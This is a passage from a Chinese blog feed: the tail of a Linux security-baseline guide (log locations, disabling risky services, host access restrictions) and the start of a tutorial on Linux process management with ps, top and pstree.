Linux系统默认启用以下类型日志：</p><pre><code>系统日志（默认）/var/log/messagescron日志（默认）/var/log/cron安全日志（默认）/var/log/secure审计日志（默认）/var/log/audit/audit.log注意：部分系统可能使用syslog-ng日志，配置文件为：/etc/syslog-ng/syslog-ng.conf。请根据实际环境配置。</code></pre><h2 id="第5章-防范"><a href="#第5章-防范" class="headerlink" title="第5章 防范"></a><strong>第5章 防范</strong></h2><h3 id="5-1-关闭非必要的服务"><a href="#5-1-关闭非必要的服务" class="headerlink" title="5.1 关闭非必要的服务"></a><strong>5.1 关闭非必要的服务</strong></h3><p><strong>安全基线项目名称</strong> </p><pre><code>应关闭不需要的系统服务、默认共享和高危端口；</code></pre><p><strong>实施操作</strong></p><p>1、查看开放的服务列表</p><pre><code>chkconfig --list  或 systemctl list-unit-files |grep enabled</code></pre><p>2、如下方式禁用不必要的服务</p><pre><code>service &lt;服务名&gt; stop chkconfig --level 2345 &lt;服务名&gt; off 或 systemctl stop &lt;服务名&gt; systemctl disable &lt;服务名&gt;</code></pre><p>3、查看并确认是否开放的端口都为业务需要端口，是否已经关闭非必需的端口</p><p>netstat -ntlp</p><p>备注 参考说明</p><pre><code>Linux/Unix系统服务中，部分服务存在较高安全风险，应当禁用，包括：“lpd”，此服务为行式打印机后台程序，用于假脱机打印工作的UNIX后台程序，此服务通常情况下不用，建议禁用；“telnet”，此服务采用明文传输数据，登陆信息容易被窃取，建议用ssh代替；“routed”，此服务为路由守护进程，使用动态RIP路由选择协议，建议禁用；“sendmail”，此服务为邮件服务守护进程，非邮件服务器应将其关闭；“Bluetooth”，此服务为蓝牙服务，如果不需要蓝牙服务时应关闭等</code></pre><h3 id="5-2-系统最小化安装原则"><a href="#5-2-系统最小化安装原则" class="headerlink" title="5.2 系统最小化安装原则"></a><strong>5.2 系统最小化安装原则</strong></h3><p><strong>安全基线项目名称</strong> </p><pre><code>应遵循最小安装的原则，仅安装需要的组件和应用程序；应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制；应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞</code></pre><p><strong>实施操作</strong></p><p>1、查看操作系统中已安装的程序包，询问是否有目前不需要的组件和应用程序，高风险且不需要的组件，建议卸载</p><p>yum list installed</p><p>2、查看并确认是否开放的端口都为业务需要端口，是否已经关闭非必需的端口</p><p>netstat -ntlp</p><p>3、查看在/etc/hosts.deny中是否有“ALL:ALL”，禁止所有的请求：</p><p>在/etc/hosts.allow中，是否有如下配置（举例）：sshd：192.168.31.100/255.255.255.0）如果安装有主机防火墙则查看有无登录地址限制</p><p>cat /etc/hosts.deny<br> cat /etc/hosts.allow</p><p>4、访谈并查看检测的措施</p><p>（1）经常通过如下命令查看的重要线索（例如Telnet.FTP等），涉及命令</p><pre><code>more /var/log/secure | grep refused</code></pre><p>（2）查看是否启用了主机防火墙、TCPSYN保护机制等设置。</p><p>（3）访谈系统管理员是否安装了主机检测软件。查看已安装的主机，检查系统的配置情况，是否具备报警功能。</p><p>（4）检查是否安装了主机检测软件，如Dragon Squire by Enterasys Networks，ITA by Symantec.Hostsentry by Psionic Software.Logcheck by Psiomc Software.RealSecure-agent by ISS。</p><p>（5）查看网络拓扑图，查看网络上是否部署了网络检测系统，如IDS。</p><pre><code>备注需要安装net-tools以支持netstat命令yum -y install net-tools</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络运维篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux系统管理</title>
      <link href="/posts/6c72ecbc.html"/>
      <url>/posts/6c72ecbc.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、进程管理"><a href="#一、进程管理" class="headerlink" title="一、进程管理"></a>一、进程管理</h2><p>无论是 Linux 系统管理员还是普通用户，监视系统进程的运行情况并适时终止一些失控的进程，是每天的例行事务。和 Linux 系统相比，进程管理在 Windows 中更加直观，它主要是使用”任务管理器”来进行进程管理的。</p><pre><code>通常，使用"任务管理器"主要有 3 个目的：1. 利用"应用程序"和"进程"标签来査看系统中到底运行了哪些程序和进程；2. 利用"性能"和"用户"标签来判断服务器的健康状态；3. 在"应用程序"和"进程"标签中强制中止任务和进程；</code></pre><p>Linux 中虽然使用命令进行进程管理，但是进程管理的主要目的是一样的，即查看系统中运行的程序和进程、判断服务器的健康状态和强制中止不需要的进程。</p><h3 id="1-1-什么是进程和程序"><a href="#1-1-什么是进程和程序" class="headerlink" title="1.1    什么是进程和程序"></a>1.1    什么是进程和程序</h3><p>进程是正在执行的一个程序或命令，每个进程都是一个运行的实体，都有自己的地址空间，并占用一定的系统资源。</p><p>程序是人使用计算机语言编写的可以实现特定目标或解决特定问题的代码集合。</p><pre><code>程序是二进制文件，是静态存放在磁盘上的，不会占用系统运行资源(cpu/内存)。进程是用户执行程序或者触发程序的结果，可以认为进程是程序的一个运行实例。进程是动态的，会申请和使用系统资源，并与操作系统内核进行交互。</code></pre><p>这么讲很难理解，那我们换一种说法。程序是人使用计算机语言编写的，可以实现一定功能，并且可以执行的代码集合。而进程是正在执行中的程序。</p><p>当程序被执行时，执行人的权限和属性，以及程序的代码都会被加载入内存，操作系统给这个进程分配一个 ID，称为 PID（进程 ID）。</p><pre><code>也就是说，在操作系统中，所有可以执行的程序与命令都会产生进程。只是有些程序和命令非常简单，如 ls 命令、touch 命令等，它们在执行完后就会结束，相应的进程也就会终结，所以我们很难捕捉到这些进程。但是还有一些程和命令，比如 httpd 进程，启动之后就会一直驻留在系统当中，我们把这样的进程称作常驻内存进程。</code></pre><p>某些进程会产生一些新的进程，我们把这些进程称作子进程，而把这个进程本身称作父进程。比如，我们必须正常登录到 Shell 环境中才能执行系统命令，而 Linux 的标准 Shell 是 bash。我们在 bash 当中执行了 ls 命令，那么 bash 就是父进程，而 ls 命令是在 bash 进程中产生的进程，所以 ls 进程是 bash 进程的子进程。也就是说，子进程是依赖父进程而产生的，如果父进程不存在，那么子进程也不存在了。</p><h3 id="1-2-进程管理的作用"><a href="#1-2-进程管理的作用" class="headerlink" title="1.2    进程管理的作用"></a>1.2    进程管理的作用</h3><p>在使用 Windows 系统的过程中，使用任务管理器，很大程度上是为了强制关闭“未反应”的软件，也就是杀死进程。的确，这是很多使用进程管理工具或进程管理命令的人最常见的使用方法。不过，杀死进程（强制中止进程）只是进程管理工作中最不常用的手段，因为每个进程都有自己正确的结束方法，而杀死进程是在正常方法已经失效的情况下的后备手段。</p><p>那么，进程管理到底应该是做什么的呢？我以为，进程管理主要有以下 3 个作用。</p><pre><code> 1) 判断服务器的健康状态进程管理最主要的工作就是判断服务器当前运行是否健康，是否需要人为干预。如果服务器的 CPU 占用率、内存占用率过高，就需要人为介入解决问题了。这又出现了一个问题，我们发现服务器的 CPU 或内存占用率很高，该如何介入呢？是直接终止高负载的进程吗？当然不是，应该判断这个进程是否是正常进程，如果是正常进程，则说明你的服务器已经不能满足应用需求，你需要更好的硬件或搭建集群了；如果是非法进程占用了系统资源，则更不能直接中止进程，而要判断非法进程的来源、作用和所在位置，从而把它彻底清除。 2) 查看系统中所有的进程我们需要查看看系统中所有正在运行的进程，通过这些进程可以判断系统中运行了哪些服务、是否有非法服务在运行。 3) 杀死进程这是进程管理中最不常用的手段。当需要停止服务时，会通过正确关闭命令来停止服务（如 apache 服务可以通过 service httpd stop 命令来关闭）。只有在正确终止进程的手段失效的情况下，才会考虑使用 kill 命令杀死进程。</code></pre><h3 id="1-3-进程启动的方式"><a href="#1-3-进程启动的方式" class="headerlink" title="1.3    进程启动的方式"></a>1.3    进程启动的方式</h3><p>在 Linux 系统中，每个进程都有一个唯一的进程号（PID），方便系统识别和调度进程。通过简单地输出运行程序的程序名，就可以运行该程序，其实也就是启动了一个进程。</p><p>总体来说，启动一个进程主要有 2 种途径，分别是通过手工启动和通过调度启动（事先进行设置，根据用户要求，进程可以自行启动）</p><h4 id="1）Linux手工启动进程"><a href="#1）Linux手工启动进程" class="headerlink" title="1）Linux手工启动进程"></a>1）Linux手工启动进程</h4><p>手工启动进程指的是由用户输入命令直接启动一个进程，根据所启动的进程类型和性质的不同，其又可以细分为前台启动和后台启动 2 种方式。</p><p><strong>前台启动进程</strong></p><p>这是手工启动进程最常用的方式，因为当用户输入一个命令并运行，就已经启动了一个进程，而且是一个前台的进程</p><p><strong>后台启动进程</strong></p><p>进程直接从后台运行，用的相对较少，除非该进程非常耗时，且用户也不急着需要其运行结果的时候，例如，用户需要启动一个需要长时间运行的格式化文本文件的进程，为了不使整个 Shell 在格式化过程中都处于“被占用”状态，从后台启动这个进程是比较明智的选择。</p><p>从后台启动进程，其实就是在命令结尾处添加一个 “ &amp;” 符号（注意，&amp; 前面有空格）。输入命令并运行之后，Shell 会提供给我们一个数字，此数字就是该进程的进程号。然后直接就会出现提示符，用户就可以继续完成其他工作，例如：</p><pre><code>[root@localhost ~]# find / -name install.log &amp;[1] 1920#[1]是工作号，1920是进程号</code></pre><p>以上手工启动的 2 种方式，实际上它们有个共同的特点，就是新进程都是由当前 Shell 这个进程产生的，换句话说，是 Shell 创建了新进程，于是称这种关系为进程间的父子关系，其中 Shell 是父进程，新进程是子进程。</p><pre><code>值得一提的是，一个父进程可以有多个子进程，通常子进程结束后才能继续父进程；当然，如果是从后台启动，父进程就不用等待子进程了。</code></pre><h4 id="2）Linux调度启动进程"><a href="#2）Linux调度启动进程" class="headerlink" title="2）Linux调度启动进程"></a>2）Linux调度启动进程</h4><p>在 Linux 系统中，任务可以被配置在指定的时间、日期或者系统平均负载量低于指定值时自动启动。</p><p>例如，Linux 预配置了重要系统任务的运行，以便可以使系统能够实时被更新，系统管理员也可以使用自动化的任务来定期对重要数据进行备份。</p><pre><code>实现调度启动进程的方法有很多，例如通过 crontab、at 等命令</code></pre><h3 id="1-4-查看进程"><a href="#1-4-查看进程" class="headerlink" title="1.4    查看进程"></a>1.4    查看进程</h3><h4 id="1-4-1-ps命令：查看正在运行的进程"><a href="#1-4-1-ps命令：查看正在运行的进程" class="headerlink" title="1.4.1    ps命令：查看正在运行的进程"></a>1.4.1    ps命令：查看正在运行的进程</h4><p>ps 命令是最常用的监控进程的命令，通过此命令可以查看系统中所有运行进程的详细信息。</p><p>ps 命令的基本格式如下：</p><pre><code>[root@localhost ~]# ps aux\#查看系统中所有的进程，使用 BS 操作系统格式[root@localhost ~]# ps -le\#查看系统中所有的进程，使用 Linux 标准命令格式</code></pre><p>选项：</p><ul><li><table><thead><tr><th>a</th><th>显示一个终端的所有进程，除会话引线外；</th></tr></thead><tbody><tr><td>u</td><td>显示进程的归属用户及内存的使用情况；</td></tr><tr><td>x</td><td>显示没有控制终端的进程；</td></tr><tr><td>-l</td><td>长格式显示更加详细的信息；</td></tr><tr><td>-e</td><td>显示所有进程；</td></tr></tbody></table></li></ul><p>可以看到，ps 命令有些与众不同，它的部分选项不能加入”-“，比如命令”ps aux”，其中”aux”是选项，但是前面不能带“-”。</p><ul><li>“ps aux” 可以查看系统中所有的进程；</li><li>“ps -le” 可以查看系统中所有的进程，而且还能看到进程的父进程的 PID 和进程优先级；</li><li>“ps -l” 只能看到当前 Shell 产生的进程；</li></ul><p>有这三个命令就足够了，下面分别来查看。</p><p>【例 1】</p><pre><code>[root@localhost ~]# ps aux#查看系统中所有的进程USER PID %CPU %MEM  VSZ  RSS   TTY STAT START TIME COMMANDroot   1  0.0  0.2 2872 1416   ?   Ss   Jun04 0:02 /sbin/initroot   2  0.0  0.0    0    0   ?    S   Jun04 0:00 [kthreadd]root   3  0.0  0.0    0    0   ?    S   Jun04 0:00 [migration/0]root   4  0.0  0.0    0    0   ?    S   Jun04 0:00 [ksoftirqd/0]…省略部分输出…</code></pre><p>表 1 中罗列出了以上输出信息中各列的具体含义。</p><table><thead><tr><th>表头</th><th>含义</th></tr></thead><tbody><tr><td>USER</td><td>该进程是由哪个用户产生的。</td></tr><tr><td>PID</td><td>进程的 ID。</td></tr><tr><td>%CPU</td><td>该进程占用 CPU 资源的百分比，占用的百分比越高，进程越耗费资源。</td></tr><tr><td>%MEM</td><td>该进程占用物理内存的百分比，占用的百分比越高，进程越耗费资源。</td></tr><tr><td>VSZ</td><td>该进程占用虚拟内存的大小，单位为 KB。</td></tr><tr><td>RSS</td><td>该进程占用实际物理内存的大小，单位为 KB。</td></tr><tr><td>TTY</td><td>该进程是在哪个终端运行的。</td></tr><tr><td>STAT</td><td>进程状态。常见的状态有以下几种：-D：不可被唤醒的睡眠状态，通常用于 I/O 情况。-R：该进程正在运行。-S：该进程处于睡眠状态，可被唤醒。-T：停止状态，可能是在后台暂停或进程处于除错状态。-W：内存交互状态（从 2.6 内核开始无效）。-X：死掉的进程（应该不会出现）。-Z：僵尸进程。进程已经中止，但是部分程序还在内存当中。-&lt;：高优先级（以下状态在 BSD 格式中出现）。-N：低优先级。-L：被锁入内存。-s：包含子进程。-l：多线程（小写 L）。-+：位于后台。</td></tr><tr><td>START</td><td>该进程的启动时间。</td></tr><tr><td>TIME</td><td>该进程占用 CPU 的运算时间，注意不是系统时间。</td></tr><tr><td>COMMAND</td><td>产生此进程的命令名。</td></tr></tbody></table><p>【例 2】”ps aux”命令可以看到系统中所有的进程，”ps -le”命令也能看到系统中所有的进程。由于 “-l” 选项的作用，所以 “ps -le” 命令能够看到更加详细的信息，比如父进程的 PID、优先级等。但是这两个命令的基本作用是一致的，掌握其中一个就足够了。</p><pre><code>[root@localhost ~]# ps -leF S UID PID PPID C  PRI Nl ADDR  SZ WCHAN TTY      TIME  CMD4 S   0   1    0 0  80   0 -    718 -     ?    00:00:02  init1 S   0   2    0 0  80   0 -      0 -     ?    00:00:00  kthreadd1 S   0   3    2 0 -40   - -      0 -     ?    00:00:00  migration/01 S   0   4    2 0  80   0 -      0 -     ?    00:00:00  ksoflirqd/01 S   0   5    2 0 -40   - -      0 -     ?    00:00:00  migration/0…省略部分输出…</code></pre><p>表 2 罗列出以上输出信息中各列的含义。</p><table><thead><tr><th>表头</th><th>含义</th></tr></thead><tbody><tr><td>F</td><td>进程标志，说明进程的权限，常见的标志有两个: 1：进程可以被复制，但是不能被执行；4：进程使用超级用户权限；</td></tr><tr><td>S</td><td>进程状态。具体的状态和”psaux”命令中的 STAT 状态一致；</td></tr><tr><td>UID</td><td>运行此进程的用户的 ID；</td></tr><tr><td>PID</td><td>进程的 ID；</td></tr><tr><td>PPID</td><td>父进程的 ID；</td></tr><tr><td>C</td><td>该进程的 CPU 使用率，单位是百分比；</td></tr><tr><td>PRI</td><td>进程的优先级，数值越小，该进程的优先级越高，越早被 CPU 执行；</td></tr><tr><td>NI</td><td>进程的优先级，数值越小，该进程越早被执行；</td></tr><tr><td>ADDR</td><td>该进程在内存的哪个位置；</td></tr><tr><td>SZ</td><td>该进程占用多大内存；</td></tr><tr><td>WCHAN</td><td>该进程是否运行。”-“代表正在运行；</td></tr><tr><td>TTY</td><td>该进程由哪个终端产生；</td></tr><tr><td>TIME</td><td>该进程占用 CPU 的运算时间，注意不是系统时间；</td></tr><tr><td>CMD</td><td>产生此进程的命令名；</td></tr></tbody></table><p>【例 3】如果不想看到所有的进程，只想查看一下当前登录产生了哪些进程，那只需使用 “ps -l” 命令就足够了：</p><pre><code>[root@localhost ~]# ps -l#查看当前登录产生的进程F S UID   PID  PPID C PRI NI ADDR SZ WCHAN TTY       TIME CMD4 S 0   18618 18614 0  80  0 - 1681  -     pts/1 00:00:00 bash4 R 0   18683 18618 4  80  0 - 1619  -     pts/1 00:00:00 ps</code></pre><p>可以看到，这次从 pts/1 虚拟终端登录，只产生了两个进程：一个是登录之后生成的 Shell，也就是 bash；另一个是正在执行的 ps 命令。</p><h4 id="1-4-2-top命令：持续监听进程运行状态"><a href="#1-4-2-top命令：持续监听进程运行状态" class="headerlink" title="1.4.2    top命令：持续监听进程运行状态"></a>1.4.2    top命令：持续监听进程运行状态</h4><p>ps 命令可以一次性给出当前系统中进程状态，但使用此方式得到的信息缺乏时效性，并且，如果管理员需要实时监控进程运行情况，就必须不停地执行 ps 命令，这显然是缺乏效率的。</p><p>为此，Linux 提供了 top 命令。top 命令可以动态地持续监听进程地运行状态，与此同时，该命令还提供了一个交互界面，用户可以根据需要，人性化地定制自己的输出，进而更清楚地了进程的运行状态。</p><p>top 命令的基本格式如下：</p><pre><code>[root@localhost ~]#top [选项]</code></pre><p>选项：</p><ul><li>-d 秒数：指定 top 命令每隔几秒更新。默认是 3 秒；</li><li>-b：使用批处理模式输出。一般和”-n”选项合用，用于把 top 命令重定向到文件中；</li><li>-n 次数：指定 top 命令执行的次数。</li><li>-p 进程PID：仅查看指定 ID 的进程；</li><li>-s：使 top 命令在安全模式中运行，避免在交互模式中出现错误；</li><li>-u 用户名：只监听某个用户的进程；</li></ul><p>在 top 命令的显示窗口中，还可以使用如下按键，进行一下交互操作：</p><ul><li>? 或 h：显示交互模式的帮助；</li><li>P：按照 CPU 的使用率排序，默认就是此选项；</li><li>M：按照内存的使用率排序；</li><li>N：按照 PID 排序；</li><li>T：按照 CPU 的累积运算时间排序，也就是按照 TIME+ 项排序；</li><li>k：按照 PID 给予某个进程一个信号。一般用于中止某个进程，信号 9 是强制中止的信号；</li><li>r：按照 PID 给某个进程重设优先级（Nice）值；</li><li>q：退出 top 命令；</li></ul><p>我们看看 top 命令的执行结果，如下：</p><pre><code>[root@localhost ~]# toptop - 12:26:46 up 1 day, 13:32, 2 users, load average: 0.00, 0.00, 0.00Tasks: 95 total, 1 running, 94 sleeping, 0 stopped, 0 zombieCpu(s): 0.1%us, 0.1%sy, 0.0%ni, 99.7%id, 0.1%wa, 0.0%hi, 0.1%si, 0.0%stMem: 625344k total, 571504k used, 53840k free, 65800k buffersSwap: 524280k total, 0k used, 524280k free, 409280k cachedPID   USER PR NI VIRT  RES  SHR S %CPU %MEM   TIME+ COMMAND19002 root 20  0 2656 1068  856 R  0.3  0.2 0:01.87 top1     root 20  0 2872 1416 1200 S  0.0  0.2 0:02.55 init2     root 20  0    0    0    0 S  0.0  0.0 0:00.03 kthreadd3     root RT  0    0    0    0 S  0.0  0.0 0:00.00 migration/04     root 20  0    0    0    0 S  0.0  0.0 0:00.15 ksoftirqd/05     root RT  0    0    0    0 S  0.0  0.0 0:00.00 migration/06     root RT  0    0    0    0 S  0.0  0.0 0:10.01 watchdog/07     root 20  0    0    0    0 S  0.0  0.0 0:05.01 events/08     root 20  0    0    0    0 S  0.0  0.0 0:00.00 cgroup9     root 20  0    0    0    0 S  0.0  0.0 0:00.00 khelper10    root 20  0    0    0    0 S  0.0  0.0 0:00.00 netns11    root 20  0    0    0    0 S  0.0  0.0 0:00.00 async/mgr12    root 20  0    0    0    0 S  0.0  0.0 0:00.00 pm13    root 20  0    0    0    0 S  0.0  0.0 0:01.70 sync_supers14    root 20  0    0    0    0 S  0.0  0.0 0:00.63 bdi-default15    root 20  0    0    0    0 S  0.0  0.0 0:00.00 kintegrityd/016    root 20  0    0    0    0 S  0.0  0.0 0:02.52 kblockd/017    root 20  0    0    0    0 S  0.0  0.0 0:00.00 kacpid18    root 20  0    0    0    0 S  0.0  0.0 0:00.00 kacpi_notify</code></pre><p>我们解释一下命令的输出。top 命令的输出内容是动态的，默认每隔 3 秒刷新一次。命令的输出主要分为两部分：</p><ol><li><pre><code>1. 第一部分是前五行，显示的是整个系统的资源使用状况，我们就是通过这些输出来判断服务器的资源使用状态的；2. 第二部分从第六行开始，显示的是系统中进程的信息；</code></pre></li></ol><p>我们先来说明第一部分的作用。</p><ul><li><p>第一行为任务队列信息，具体内容如表 1 所示。</p><table><thead><tr><th>内 容</th><th>说 明</th></tr></thead><tbody><tr><td>12:26:46</td><td>系统当前时间</td></tr><tr><td>up 1 day, 13:32</td><td>系统的运行时间.本机己经运行 1 天 13 小时 32 分钟</td></tr><tr><td>2 users</td><td>当前登录了两个用户</td></tr><tr><td>load average: 0.00,0.00，0.00</td><td>系统在之前 1 分钟、5 分钟、15 分钟的平均负载。如果 CPU 是单核的，则这个数值超过 1 就是高负载：如果 CPU 是四核的，则这个数值超过 4 就是高负载 （这个平均负载完全是依据个人经验来进行判断的，一般认为不应该超过服务器 CPU 的核数）</td></tr></tbody></table></li></ul><ul><li><p>第二行为进程信息，具体内容如表 2 所示。</p><table><thead><tr><th>内 容</th><th>说 明</th></tr></thead><tbody><tr><td>Tasks: 95 total</td><td>系统中的进程总数</td></tr><tr><td>1 running</td><td>正在运行的进程数</td></tr><tr><td>94 sleeping</td><td>睡眠的进程数</td></tr><tr><td>0 stopped</td><td>正在停止的进程数</td></tr><tr><td>0 zombie</td><td>僵尸进程数。如果不是 0，则需要手工检查僵尸进程</td></tr></tbody></table></li></ul><ul><li><p>第三行为 CPU 信息，具体内容如表 3 所示。</p><table><thead><tr><th>内 容</th><th>说 明</th></tr></thead><tbody><tr><td>Cpu(s): 0.1 %us</td><td>用户模式占用的 CPU 百分比</td></tr><tr><td>0.1%sy</td><td>系统模式占用的 CPU 百分比</td></tr><tr><td>0.0%ni</td><td>改变过优先级的用户进程占用的 CPU 百分比</td></tr><tr><td>99.7%id</td><td>空闲 CPU 占用的 CPU 百分比</td></tr><tr><td>0.1%wa</td><td>等待输入/输出的进程占用的 CPU 百分比</td></tr><tr><td>0.0%hi</td><td>硬中断请求服务占用的 CPU 百分比</td></tr><tr><td>0.1%si</td><td>软中断请求服务占用的 CPU 百分比</td></tr><tr><td>0.0%st</td><td>st（steal time）意为虚拟时间百分比，就是当有虚拟机时，虚拟 CPU 等待实际 CPU 的时间百分比</td></tr></tbody></table></li></ul><ul><li><p>第四行为物理内存信息，具体内容如表 4 所示。</p><table><thead><tr><th>内 容</th><th>说 明</th></tr></thead><tbody><tr><td>Mem: 625344k total</td><td>物理内存的总量，单位为KB</td></tr><tr><td>571504k used</td><td>己经使用的物理内存数量</td></tr><tr><td>53840k&amp;ee</td><td>空闲的物理内存数量。我们使用的是虚拟机，共分配了 628MB内存，所以只有53MB的空闲内存</td></tr><tr><td>65800k buffers</td><td>作为缓冲的内存数量</td></tr></tbody></table></li></ul><ul><li><p>第五行为交换分区（swap）信息，如表 5 所示。</p><table><thead><tr><th>内 容</th><th>说 明</th></tr></thead><tbody><tr><td>Swap: 524280k total</td><td>交换分区（虚拟内存）的总大小</td></tr><tr><td>Ok used</td><td>已经使用的交换分区的大小</td></tr><tr><td>524280k free</td><td>空闲交换分区的大小</td></tr><tr><td>409280k cached</td><td>作为缓存的交换分区的大小</td></tr></tbody></table></li></ul><p>我们通过 top 命令的第一部分就可以判断服务器的健康状态。如果 1 分钟、5 分钟、15 分钟的平均负载高于 1，则证明系统压力较大。如果 CPU 的使用率过高或空闲率过低，则证明系统压力较大。如果物理内存的空闲内存过小，则也证明系统压力较大。</p><p>这时，我们就应该判断是什么进程占用了系统资源。如果是不必要的进程，就应该结束这些进程；如果是必需进程，那么我们该増加服务器资源（比如増加虚拟机内存），或者建立集群服务器。</p><p>我们还要解释一下缓冲（buffer）和缓存（cache）的区别：</p><ul><li><pre><code>- 缓存（cache）是在读取硬盘中的数据时，把最常用的数据保存在内存的缓存区中，再次读取该数据时，就不去硬盘中读取了，而在缓存中读取。- 缓冲（buffer）是在向硬盘写入数据时，先把数据放入缓冲区,然后再一起向硬盘写入，把分散的写操作集中进行，减少磁盘碎片和硬盘的反复寻道，从而提高系统性能。</code></pre></li></ul><p>简单来说，缓存（cache）是用来加速数据从硬盘中”读取”的，而缓冲（buffer）是用来加速数据”写入”硬盘的。</p><p>再来看 top 命令的第二部分输出，主要是系统进程信息，各个字段的含义如下：</p><ul><li><pre><code>- PID：进程的 ID。- USER：该进程所属的用户。- PR：优先级，数值越小优先级越高。- NI：优先级，数值越小、优先级越高。- VIRT：该进程使用的虚拟内存的大小，单位为 KB。- RES：该进程使用的物理内存的大小，单位为 KB。- SHR：共享内存大小，单位为 KB。- S：进程状态。- %CPU：该进程占用 CPU 的百分比。- %MEM：该进程占用内存的百分比。- TIME+：该进程共占用的 CPU 时间。- COMMAND：进程的命令名。PRI 代表 Priority，NI 代表 Nice。这两个值都表示优先级，数值越小代表该进程越优先被 CPU 处理。不过，PRI值是由内核动态调整的，用户不能直接修改。所以我们只能通过修改 NI 值来影响 PRI 值，间接地调整进程优先级。</code></pre></li></ul><p>这部分和 ps 命令的输出比较类似，只是如果在终端执行 top 命令，则不能看到所有的进程，而只能看到占比靠前的进程。接下来我们举几个 top 命令常用的实例。</p><p>【例 1】如果只想让 top 命令查看某个进程，就可以使用 “-p 选项”。命令如下：</p><pre><code>[root@localhost ~]# top -p 15273#只查看 PID为 15273的apache进程top - 14:28:47 up 1 day, 15:34, 3 users, load average: 0.00,0.00,0.00Tasks: 1 total, 0 running, 1 sleeping, 0 stopped, 0 zombieCpu(s): 0.0%us, 0.0%sy, 0.0%ni,100.0%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%stMem: 625344k total, 574124k used, 51220k free, 67024k buffersSwap: 524280k total, Ok used, 524280k free, 409344k cachedPID     USER PR NI VIRT  RES SHR S %CPU %MEM  TIME+  COMMAND15273 daemon 20 0  4520 1192 580 S  0.0  0.2 0:00.00   httpd</code></pre><p>【例 2】top 命令如果不正确退出，则会持续运行。在 top 命令的交互界面中按 “q” 键会退出 top 命令；也可以按 “?” 或 “h” 键得到 top 命令交互界面的帮助信息；还可以按键中止某个进程。比如：</p><pre><code>[root@localhost ~]# toptop - 14:10:15 up 1 day, 15:15， 3 users, load average: 0.00，0.00, 0.00Tasks: 97 total, 1 running, 96 sleeping, 0 stopped, 0 zombieCpu(s): 0.0%us, 0.0%sy, 0.0%ni,100.0%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%stMem: 625344k total, 574248k used, 51096k free, 66840k buffersSwap: 524280k total, Ok used, 524280k free, 409324k cachedPID to kill:15273#按"k"键，会提示输入要杀死进程的PIDPID     USER PR NI VIRT  RES SHR S %CPU %MEM   TIME+ COMMAND15273 daemon 20  0 4520 1192 580 S  0.0 0.2  0:00.00 httpd..省略部分输出...</code></pre><p>【例 3】输入要中止进程的 PID，比如要中止 15273 这个 apache 进程，命令如下：</p><pre><code>top - 14:11:42 up 1 day, 15:17， 3 users, load average: 0.00，0.00, 0.00Tasks: 97 total, 1 running, 96 sleeping, 0 stopped, 0 zombieCpu(s): 0.0%us, 0.3%sy, 0.0%ni, 99.7%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%stMem: 625344k total, 574248k used, 51096k free, 66856k buffersSwap: 524280k total, 0k used, 524280k free, 409324k cachedKill PID 15273 with signal [15]:9#提示输入信号，信号9代表强制中止PID     USER PR NI VIRT  RES SHR S %CPU %MEM   TIME+ COMMAND15273 daemon 20  0 4520 1192 580 S 0.0   0.2 0:00.00 httpd…省略部分输出…</code></pre><p>接下来 top 命令提示我们输入信号，信号 9 代表强制中止，这时就能够强制中止 15273 进程了。</p><p>【例 4】如果要改变某个进程的优先级，就要利用 “r” 交互命令。需要注意的是，我们能够修改的只有 Nice 的优先级，而不能修改 Priority 的优先级。具体修改命令如下：</p><pre><code>[root@localhost ~]# top -p 18977top - 14:17:09 up 1 day, 15:22, 3 users, load average: 0.00，0.00, 0.00Tasks: 97 total, 1 running, 96 sleeping, 0 stopped, 0 zombieCpu(s): 0.3%us, 0.0%sy, 0.0%ni, 99.7%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%stMem: 625344k total, 574124k used, 51220k free, 66896k buffersSwap: 524280k total, 0k used, 524280k free, 409324k cachedPID to renice:#输入"r"交互命令之后，提示输入要修改优先级的进程的PIDPID   USER PR NI  VIRT  RES SHR  S %CPU %MEM   TIME+ COMMAND18977 root 20 0  11592 3304 2572 S  0.0 0.5  0:04.37 sshd</code></pre><p>输入 “r” 交互命令，会提示输入需要修改优先级的进程的 PID。例如，我们想要修改 18977 这个 sshd 远程连接进程的优先级，就输入该进程的 PID。命令如下：</p><pre><code>Renice PID 18977 to value: 10#输入PID后，需要输入Nice的优先级号#我们把18977进程的优先级调整为10,回车后就能看到PID   USER PR NI  VIRT  RES SHR  S %CPU %MEM   TIME+ COMMAND18977 root 30 10 11592 3304 2572 R  0.0 0.5  0:04.38 sshd#18977进程的优先级已经被修改了</code></pre><p>【例 5】如果在操作终端执行 top 命令，则并不能看到系统中所有的进程，默认看到的只是 CPU 占比靠前的进程。如果我们想要看到所有的进程，则可以把 top 命令的执行结果重定向到文件中。不过 top 命令是持续运行的，这时就需要使用 “-b” 和 “-n” 选项了。具体命令如下：</p><p>[root@localhost ~]# top -b -n 1 &gt; /root/top.log<br>#让top命令只执行一次，然后把执行结果保存到top.log文件中，这样就能看到所有的进程了</p><h4 id="1-4-3-pstree命令：查看进程树"><a href="#1-4-3-pstree命令：查看进程树" class="headerlink" title="1.4.3    pstree命令：查看进程树"></a>1.4.3    pstree命令：查看进程树</h4><p>pstree 命令是以树形结构显示程序和进程之间的关系，此命令的基本格式如下：</p><pre><code>[root@localhost ~]# pstree [选项] [PID或用户名]</code></pre><p>如果系统提示“-bash: pstree: command not found”，使用“yum -y install psmisc”命令安装pstree命令。</p><p>表 1 罗列出了 pstree 